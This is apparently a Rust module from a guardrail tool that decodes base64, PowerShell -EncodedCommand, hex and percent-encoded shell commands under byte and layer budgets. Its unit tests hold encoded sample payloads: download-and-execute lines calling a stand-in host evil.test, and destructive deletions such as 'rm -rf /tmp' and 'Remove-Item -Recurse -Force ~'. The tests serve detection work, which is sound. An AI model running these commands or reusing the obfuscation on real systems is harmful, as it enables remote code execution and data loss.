// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: The Guardrails ADR Authors

//! Deterministic bounded decoders for base64, PowerShell `-EncodedCommand`, hex, URL-encoding, and gzip (`D-10`).

use base64::Engine as _;
use base64::engine::general_purpose::{STANDARD, STANDARD_NO_PAD, URL_SAFE, URL_SAFE_NO_PAD};

use crate::analyze::decode_layers::{
    bytes_to_peeled_text, decode_base64_payload_layers, recursively_peel_payload,
};
use crate::analyze::decode_pipe::{
    detect_base64_decode_payloads, detect_hex_decode_payloads,
    extract_all_from_base64_calls_for_dialect, extract_ps_encoded_arg, is_powershell_context,
    is_ps_stop_flag, is_ps_value_flag, split_pipe_clauses, unwrap_clause_slice,
};
use crate::analyze::types::{AnalyzeLimits, ShellDialect};

pub(crate) use crate::analyze::decode_layers::decode_payload_layers_checked;
pub use crate::analyze::decode_layers::{decode_payload_layers, decode_payload_layers_with_budget};

pub const MAX_DECODE_LAYERS: u8 = 3;
pub const MAX_DECODED_BYTES: usize = 1_048_576;

pub(super) const MIN_HEX_RUN_BYTES: usize = 6;
pub(super) const MIN_AUTO_B64_CHARS: usize = 8;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum DecodeKind {
    Base64Utf8,
    Base64Utf16Le,
    Hex,
    UrlPercent,
    Gzip,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum DecodeStatus {
    Clean,
    Decoded,
    Malformed,
    LimitExceeded,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct DecodeOutcome {
    pub status: DecodeStatus,
    pub layers: u8,
    pub kinds: Vec<DecodeKind>,
    pub decoded_payloads: Vec<String>,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub struct DecodeBudget {
    pub remaining_bytes: usize,
    pub max_layers: u8,
    pub remaining_nodes: usize,
}

impl DecodeStatus {
    #[must_use]
    pub const fn merge(self, other: Self) -> Self {
        match (self, other) {
            (Self::LimitExceeded, _) | (_, Self::LimitExceeded) => Self::LimitExceeded,
            (Self::Malformed, _) | (_, Self::Malformed) => Self::Malformed,
            (Self::Decoded, _) | (_, Self::Decoded) => Self::Decoded,
            (Self::Clean, Self::Clean) => Self::Clean,
        }
    }
}

impl DecodeOutcome {
    #[must_use]
    pub fn empty_clean() -> Self {
        Self {
            status: DecodeStatus::Clean,
            layers: 0,
            kinds: Vec::new(),
            decoded_payloads: Vec::new(),
        }
    }
}

impl DecodeBudget {
    #[must_use]
    pub fn from_schema() -> Self {
        let limits = AnalyzeLimits::from_schema();
        Self {
            remaining_bytes: limits.decode_max_bytes,
            max_layers: limits.decode_max_layers,
            remaining_nodes: limits.decode_max_nodes,
        }
    }

    #[must_use]
    pub const fn new(remaining_bytes: usize, max_layers: u8, remaining_nodes: usize) -> Self {
        Self {
            remaining_bytes,
            max_layers,
            remaining_nodes,
        }
    }

    pub fn consume_bytes(&mut self, len: usize) -> Result<(), DecodeStatus> {
        if len > self.remaining_bytes {
            return Err(DecodeStatus::LimitExceeded);
        }
        self.remaining_bytes = self.remaining_bytes.saturating_sub(len);
        Ok(())
    }

    pub fn take_node(&mut self) -> Result<(), DecodeStatus> {
        if self.remaining_nodes == 0 {
            return Err(DecodeStatus::LimitExceeded);
        }
        self.remaining_nodes = self.remaining_nodes.saturating_sub(1);
        Ok(())
    }
}

pub fn decode_base64_bounded(raw: &str) -> Result<Vec<u8>, DecodeStatus> {
    let mut budget = DecodeBudget::from_schema();
    decode_base64_with_budget(raw, &mut budget)
}

pub fn decode_base64_with_budget(
    raw: &str,
    budget: &mut DecodeBudget,
) -> Result<Vec<u8>, DecodeStatus> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err(DecodeStatus::Malformed);
    }
    let estimated = trimmed.len().saturating_mul(3) / 4;
    if estimated > budget.remaining_bytes.saturating_add(2) {
        return Err(DecodeStatus::LimitExceeded);
    }
    for engine in [&STANDARD, &STANDARD_NO_PAD, &URL_SAFE, &URL_SAFE_NO_PAD] {
        if let Ok(bytes) = engine.decode(trimmed) {
            budget.consume_bytes(bytes.len())?;
            return Ok(bytes);
        }
    }
    Err(DecodeStatus::Malformed)
}

/// Strictly decodes PowerShell `-EncodedCommand` as UTF-16LE (rejecting odd lengths, surrogates, and NULs).
pub fn decode_powershell_encoded_command(b64: &str) -> Result<String, DecodeStatus> {
    let mut budget = DecodeBudget::from_schema();
    decode_powershell_encoded_with_budget(b64, &mut budget)
}

pub fn decode_powershell_encoded_with_budget(
    b64: &str,
    budget: &mut DecodeBudget,
) -> Result<String, DecodeStatus> {
    let raw_bytes = decode_base64_with_budget(b64, budget)?;
    decode_strict_utf16le(&raw_bytes)
}

pub(super) fn decode_strict_utf16le(bytes: &[u8]) -> Result<String, DecodeStatus> {
    if bytes.is_empty() || !bytes.len().is_multiple_of(2) {
        return Err(DecodeStatus::Malformed);
    }
    let mut units = Vec::with_capacity(bytes.len() / 2);
    for chunk in bytes.as_chunks::<2>().0 {
        units.push(u16::from_le_bytes(*chunk));
    }
    if units.first() == Some(&0xFFFE) {
        return Err(DecodeStatus::Malformed);
    }
    let slice = if units.first() == Some(&0xFEFF) {
        units.get(1..).unwrap_or(&[])
    } else {
        units.as_slice()
    };
    let text = String::from_utf16(slice).map_err(|_| DecodeStatus::Malformed)?;
    if text.contains('\0') {
        return Err(DecodeStatus::Malformed);
    }
    Ok(text)
}

pub fn decode_hex_bounded(raw: &str) -> Result<Vec<u8>, DecodeStatus> {
    let mut budget = DecodeBudget::from_schema();
    decode_hex_with_budget(raw, &mut budget)
}

pub fn decode_hex_with_budget(
    raw: &str,
    budget: &mut DecodeBudget,
) -> Result<Vec<u8>, DecodeStatus> {
    let trimmed = raw.trim();
    let body = trimmed
        .strip_prefix("0x")
        .or_else(|| trimmed.strip_prefix("0X"))
        .unwrap_or(trimmed);
    let mut hex_count = 0usize;
    for b in body.bytes() {
        if b.is_ascii_whitespace() {
            continue;
        }
        if !b.is_ascii_hexdigit() {
            return Err(DecodeStatus::Malformed);
        }
        hex_count = hex_count.saturating_add(1);
    }
    if hex_count == 0 || !hex_count.is_multiple_of(2) {
        return Err(DecodeStatus::Malformed);
    }
    let byte_len = hex_count / 2;
    budget.consume_bytes(byte_len)?;

    let mut out = Vec::with_capacity(byte_len);
    let mut pending_hi: Option<u8> = None;
    for b in body.bytes() {
        if b.is_ascii_whitespace() {
            continue;
        }
        let nib = hex_nibble(b).ok_or(DecodeStatus::Malformed)?;
        if let Some(hi) = pending_hi.take() {
            out.push((hi << 4) | nib);
        } else {
            pending_hi = Some(nib);
        }
    }
    Ok(out)
}

/// Decodes `%HH` sequences to raw bytes so binary payloads (such as gzip `%1f%8b`) are preserved.
#[must_use]
pub fn decode_url_percent_once_bytes(raw: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(raw.len());
    let mut idx: usize = 0;
    while idx < raw.len() {
        if raw.get(idx) == Some(&b'%')
            && let (Some(&hi), Some(&lo)) = (
                raw.get(idx.saturating_add(1)),
                raw.get(idx.saturating_add(2)),
            )
            && let (Some(h), Some(l)) = (hex_nibble(hi), hex_nibble(lo))
        {
            out.push((h << 4) | l);
            idx = idx.saturating_add(3);
            continue;
        }
        if let Some(&b) = raw.get(idx) {
            out.push(b);
        }
        idx = idx.saturating_add(1);
    }
    out
}

#[must_use]
pub fn decode_url_percent_once(raw: &str) -> String {
    let bytes = decode_url_percent_once_bytes(raw.as_bytes());
    String::from_utf8_lossy(&bytes).into_owned()
}

#[must_use]
pub fn extract_and_decode_command_payloads(tokens: &[String]) -> DecodeOutcome {
    let mut budget = DecodeBudget::from_schema();
    extract_and_decode_for_dialect(tokens, None, &mut budget)
}

#[must_use]
pub fn extract_and_decode_for_dialect(
    tokens: &[String],
    dialect: Option<ShellDialect>,
    budget: &mut DecodeBudget,
) -> DecodeOutcome {
    let mut outcome = DecodeOutcome::empty_clean();
    let mut start = 0usize;
    for (idx, tok) in tokens.iter().enumerate() {
        if matches!(tok.as_str(), ";" | "&&" | "||") {
            if start < idx {
                let seg = tokens.get(start..idx).unwrap_or(&[]);
                decode_command_segment(seg, dialect, budget, &mut outcome);
            }
            start = idx.saturating_add(1);
        }
    }
    if start < tokens.len() {
        let seg = tokens.get(start..).unwrap_or(&[]);
        decode_command_segment(seg, dialect, budget, &mut outcome);
    }

    if outcome.layers == 0 && !outcome.decoded_payloads.is_empty() {
        outcome.layers = 1;
    }
    outcome
}

pub(crate) fn decode_pipe_only_clauses(
    tokens: &[String],
    budget: &mut DecodeBudget,
) -> DecodeOutcome {
    let mut outcome = DecodeOutcome::empty_clean();
    let clauses = split_pipe_clauses(tokens);
    for b64_arg in detect_base64_decode_payloads(&clauses, false) {
        if budget.take_node().is_err() {
            outcome.status = outcome.status.merge(DecodeStatus::LimitExceeded);
            return outcome;
        }
        match decode_base64_payload_layers(&b64_arg, budget) {
            Ok((layers, kinds, texts)) => {
                outcome.status = outcome.status.merge(DecodeStatus::Decoded);
                outcome.layers = outcome.layers.max(layers);
                outcome.kinds.extend(kinds);
                outcome.decoded_payloads.extend(texts);
            }
            Err(status) => outcome.status = outcome.status.merge(status),
        }
    }
    for hex_arg in detect_hex_decode_payloads(&clauses, false) {
        if budget.take_node().is_err() {
            outcome.status = outcome.status.merge(DecodeStatus::LimitExceeded);
            return outcome;
        }
        match decode_hex_with_budget(&hex_arg, budget) {
            Ok(bytes) => {
                outcome.status = outcome.status.merge(DecodeStatus::Decoded);
                outcome.kinds.push(DecodeKind::Hex);
                outcome.layers = outcome.layers.max(1);
                let text = bytes_to_peeled_text(&bytes, budget, &mut outcome);
                outcome.decoded_payloads.push(text);
            }
            Err(status) => outcome.status = outcome.status.merge(status),
        }
    }
    if outcome.layers == 0 && !outcome.decoded_payloads.is_empty() {
        outcome.layers = 1;
    }
    outcome
}

fn decode_command_segment(
    tokens: &[String],
    dialect: Option<ShellDialect>,
    budget: &mut DecodeBudget,
    outcome: &mut DecodeOutcome,
) {
    let clauses = split_pipe_clauses(tokens);
    for clause in &clauses {
        if is_powershell_context(clause, dialect) {
            let unwrapped = unwrap_clause_slice(clause);
            let mut idx = 1usize;
            while let Some(tok) = unwrapped.get(idx) {
                if is_ps_stop_flag(tok) {
                    break;
                }
                if let Some((payload, attached)) = extract_ps_encoded_arg(unwrapped, idx) {
                    if budget.take_node().is_err() {
                        outcome.status = outcome.status.merge(DecodeStatus::LimitExceeded);
                        return;
                    }
                    match decode_powershell_encoded_with_budget(&payload, budget) {
                        Ok(decoded) => {
                            outcome.status = outcome.status.merge(DecodeStatus::Decoded);
                            outcome.kinds.push(DecodeKind::Base64Utf16Le);
                            outcome.decoded_payloads.push(decoded.clone());
                            recursively_peel_payload(&decoded, 1, budget, outcome);
                        }
                        Err(status) => outcome.status = outcome.status.merge(status),
                    }
                    idx = idx.saturating_add(if attached { 1 } else { 2 });
                    continue;
                }
                if is_ps_value_flag(tok) {
                    idx = idx.saturating_add(2);
                    continue;
                }
                idx = idx.saturating_add(1);
            }
        }
    }

    for arg in extract_all_from_base64_calls_for_dialect(tokens, dialect) {
        if budget.take_node().is_err() {
            outcome.status = outcome.status.merge(DecodeStatus::LimitExceeded);
            return;
        }
        match decode_base64_payload_layers(&arg, budget) {
            Ok((layers, kinds, texts)) => {
                outcome.status = outcome.status.merge(DecodeStatus::Decoded);
                outcome.layers = outcome.layers.max(layers);
                outcome.kinds.extend(kinds);
                outcome.decoded_payloads.extend(texts);
            }
            Err(status) => outcome.status = outcome.status.merge(status),
        }
    }

    for b64_arg in detect_base64_decode_payloads(&clauses, true) {
        if budget.take_node().is_err() {
            outcome.status = outcome.status.merge(DecodeStatus::LimitExceeded);
            return;
        }
        match decode_base64_payload_layers(&b64_arg, budget) {
            Ok((layers, kinds, texts)) => {
                outcome.status = outcome.status.merge(DecodeStatus::Decoded);
                outcome.layers = outcome.layers.max(layers);
                outcome.kinds.extend(kinds);
                outcome.decoded_payloads.extend(texts);
            }
            Err(status) => outcome.status = outcome.status.merge(status),
        }
    }

    for hex_arg in detect_hex_decode_payloads(&clauses, true) {
        if budget.take_node().is_err() {
            outcome.status = outcome.status.merge(DecodeStatus::LimitExceeded);
            return;
        }
        match decode_hex_with_budget(&hex_arg, budget) {
            Ok(bytes) => {
                outcome.status = outcome.status.merge(DecodeStatus::Decoded);
                outcome.kinds.push(DecodeKind::Hex);
                outcome.layers = outcome.layers.max(1);
                let text = bytes_to_peeled_text(&bytes, budget, outcome);
                outcome.decoded_payloads.push(text);
            }
            Err(status) => outcome.status = outcome.status.merge(status),
        }
    }
}

const fn hex_nibble(b: u8) -> Option<u8> {
    match b {
        b'0'..=b'9' => Some(b.saturating_sub(b'0')),
        b'a'..=b'f' => Some(b.saturating_sub(b'a').saturating_add(10)),
        b'A'..=b'F' => Some(b.saturating_sub(b'A').saturating_add(10)),
        _ => None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn utf16le_b64(s: &str) -> String {
        let bytes: Vec<u8> = s.encode_utf16().flat_map(u16::to_le_bytes).collect();
        STANDARD.encode(bytes)
    }

    #[test]
    fn powershell_enc_rejects_utf8_nul_smuggling_and_gates_posix_flags() {
        // #225 B1: U+4141 padding + ASCII payload has <25% zero high bytes, must NOT fall back to UTF-8.
        let mut smuggled = "<#".encode_utf16().collect::<Vec<u16>>();
        smuggled.extend(std::iter::repeat_n(0x4141_u16, 40));
        smuggled.extend("#>iex(irm http://evil.test/p)".encode_utf16());
        let raw_bytes: Vec<u8> = smuggled.into_iter().flat_map(u16::to_le_bytes).collect();
        let b64 = STANDARD.encode(raw_bytes);
        let decoded = decode_powershell_encoded_command(&b64).expect("valid UTF-16LE");
        assert!(decoded.contains("iex(irm http://evil.test/p)"));
        assert!(!decoded.contains('\0'));

        // UTF-8 smuggled NULs or odd-byte UTF-8 payloads encoded as base64 must fail Malformed.
        let utf8_with_nul = STANDARD.encode(b"iex\0\0\0");
        assert_eq!(
            decode_powershell_encoded_command(&utf8_with_nul),
            Err(DecodeStatus::Malformed)
        );
        let odd_utf8_nul = STANDARD.encode(b"iex\0r");
        assert_eq!(
            decode_powershell_encoded_command(&odd_utf8_nul),
            Err(DecodeStatus::Malformed)
        );

        // #225 B2b: grep -e TODO must stay Clean (not Malformed!).
        let grep = ["grep", "-e", "TODO", "src"]
            .into_iter()
            .map(str::to_owned)
            .collect::<Vec<_>>();
        assert_eq!(
            extract_and_decode_command_payloads(&grep).status,
            DecodeStatus::Clean
        );

        // #224 B8: pwsh -encod prefix decodes strictly.
        let pwsh = vec![
            "pwsh".into(),
            "-encod".into(),
            utf16le_b64("Remove-Item -Recurse -Force ~"),
        ];
        let out = extract_and_decode_command_payloads(&pwsh);
        assert_eq!(out.status, DecodeStatus::Decoded);
        assert!(out.decoded_payloads[0].contains("Remove-Item"));
    }

    #[test]
    fn merges_worst_status_distinguishes_hex_and_handles_pipelines() {
        // #225 B3: earlier Malformed is not clobbered by later Decoded.
        let tokens = vec![
            "powershell".into(),
            "-enc".into(),
            "!".into(),
            "-EncodedCommand".into(),
            utf16le_b64("echo ok"),
        ];
        let mixed = extract_and_decode_command_payloads(&tokens);
        assert_eq!(mixed.status, DecodeStatus::Malformed);
        assert!(!mixed.decoded_payloads.is_empty());

        // #225 B4: xxd -p -r odd hex fails Malformed, valid xxd -p -r decodes.
        let bad_xxd: Vec<String> = ["echo", "deadbeefcafe0", "|", "xxd", "-p", "-r"]
            .into_iter()
            .map(str::to_owned)
            .collect();
        assert_eq!(
            extract_and_decode_command_payloads(&bad_xxd).status,
            DecodeStatus::Malformed
        );

        let good_xxd: Vec<String> = ["printf", "%s", "6375726c206576696c", "|", "xxd", "-p", "-r"]
            .into_iter()
            .map(str::to_owned)
            .collect();
        let xxd_out = extract_and_decode_command_payloads(&good_xxd);
        assert_eq!(xxd_out.status, DecodeStatus::Decoded);
        assert_eq!(xxd_out.decoded_payloads[0], "curl evil");

        // #229 B3: hex token in decode_payload_layers decodes as hex, not binary base64.
        let (layers, variants) = decode_payload_layers(b"6375726c2068747470");
        assert_eq!(layers, 1);
        assert_eq!(variants[0], b"curl http");

        // Raw percent decode preserves binary gzip header bytes.
        let pct = decode_url_percent_once_bytes(b"%1f%8b%08");
        assert_eq!(pct, vec![0x1F, 0x8B, 0x08]);

        // R2 fixes: grep -e inside pwsh -c is clean; top-level pwsh -e decodes; multi-segment splits;
        // herestring decodes in extract_and_decode; oversized decode returns LimitExceeded.
        let pwsh_c_grep = vec!["pwsh".into(), "-c".into(), "grep -e TODO src".into()];
        assert_eq!(
            extract_and_decode_command_payloads(&pwsh_c_grep).status,
            DecodeStatus::Clean
        );

        let seg_pwsh = vec![
            "echo".into(),
            "ok".into(),
            "&&".into(),
            "pwsh".into(),
            "-NoProfile".into(),
            "-e".into(),
            utf16le_b64("Invoke-WebRequest http://evil.test"),
        ];
        let seg_out = extract_and_decode_command_payloads(&seg_pwsh);
        assert_eq!(seg_out.status, DecodeStatus::Decoded);
        assert!(seg_out.decoded_payloads[0].contains("Invoke-WebRequest"));

        let herestring = vec!["base64".into(), "-d".into(), "<<<cm0gLXJmIC90bXA=".into()];
        let hs_out = extract_and_decode_command_payloads(&herestring);
        assert_eq!(hs_out.status, DecodeStatus::Decoded);
        assert_eq!(hs_out.decoded_payloads[0], "rm -rf /tmp");

        let mut tiny_budget = DecodeBudget::new(4, 3, 10);
        assert_eq!(
            decode_payload_layers_with_budget(b"aGVsbG8=", &mut tiny_budget).unwrap_err(),
            DecodeStatus::LimitExceeded
        );
        let huge = vec![b'a'; 2_000_000];
        assert_eq!(
            crate::analyze::decode::decode_payload_layers_checked(&huge).2,
            Some(DecodeStatus::LimitExceeded)
        );
    }

    #[test]
    fn round4_ps_value_flag_pipe_and_multilayer_decode() {
        let payload = utf16le_b64("iex(irm http://evil.test)");
        for args in [
            vec!["pwsh", "-wd", "/c", "-e", &payload],
            vec!["pwsh", "-WorkingDirectory", "/c", "-ec", &payload],
            vec![
                "pwsh", "-conf", "MyCfg", "-sett", "/tmp/s", "-cust", "p", "-e", &payload,
            ],
            vec!["echo", "ok", "|", "pwsh", "-e", &payload],
        ] {
            let tokens: Vec<String> = args.into_iter().map(str::to_owned).collect();
            let out = extract_and_decode_command_payloads(&tokens);
            assert_eq!(out.status, DecodeStatus::Decoded);
            assert!(out.decoded_payloads.iter().any(|p| p.contains("iex")));
        }

        let slash_ec = vec!["pwsh".into(), "-e".into(), "/ec=".into()];
        assert_eq!(
            extract_and_decode_command_payloads(&slash_ec).status,
            DecodeStatus::Decoded
        );

        let inner_b64 = STANDARD.encode(b"curl evil");
        let outer_b64 = STANDARD.encode(inner_b64.as_bytes());
        let nested_pipe = vec![
            "echo".into(),
            outer_b64,
            "|".into(),
            "base64".into(),
            "-d".into(),
        ];
        let nested_out = extract_and_decode_command_payloads(&nested_pipe);
        assert_eq!(nested_out.status, DecodeStatus::Decoded);
        assert!(nested_out.decoded_payloads.contains(&inner_b64));
        assert!(nested_out.decoded_payloads.iter().any(|p| p == "curl evil"));

        let spaced_from_b64 = vec![
            "pwsh".into(),
            "-c".into(),
            "[Convert]::FromBase64String ('cm0gLXJmIC90bXA=')".into(),
        ];
        let spaced_out = extract_and_decode_command_payloads(&spaced_from_b64);
        assert_eq!(spaced_out.status, DecodeStatus::Decoded);
        assert!(
            spaced_out
                .decoded_payloads
                .iter()
                .any(|p| p == "rm -rf /tmp")
        );
    }
}
